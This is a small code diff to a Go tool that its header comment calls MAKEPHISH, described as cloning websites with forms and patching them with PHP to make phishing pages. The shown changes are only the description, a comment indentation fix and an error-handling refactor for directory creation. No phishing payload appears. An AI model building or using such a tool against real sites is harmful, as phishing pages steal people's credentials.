@@ -1,6 +1,7 @@
 /*
 
-
+- MAKEPHISH -
+Automatically clone simple websites with a form and patch them with PHP to create phishing pages
 
 */
 
@@ -69,7 +70,7 @@ func main() {
 		fmt.Fprintf(os.Stderr, "\n\nEmpty URL, please specify a URL using the -u flag.\n")
 		os.Exit(1)
 
-		// remove / from end of url
+	// remove / from end of url
 	} else if string(urlin[len(urlin)-1]) == "/" {
 		urlin = urlin[0 : len(urlin)-1]
 	}
@@ -127,8 +128,7 @@ func main() {
 		fold := path.Dir(p.EscapedPath())
 		filename := path.Base(p.EscapedPath())
 		if fold != "" {
-			err := utils.MkdirIfNotExist(destFolder + "/" + fold)
-			if err != nil {
+			if err := utils.MkdirIfNotExist(destFolder + "/" + fold); err != nil {
 				fmt.Fprintf(os.Stderr, ": Error while creating the directory to save files: %s\n", err)
 				os.Exit(1)
 			}
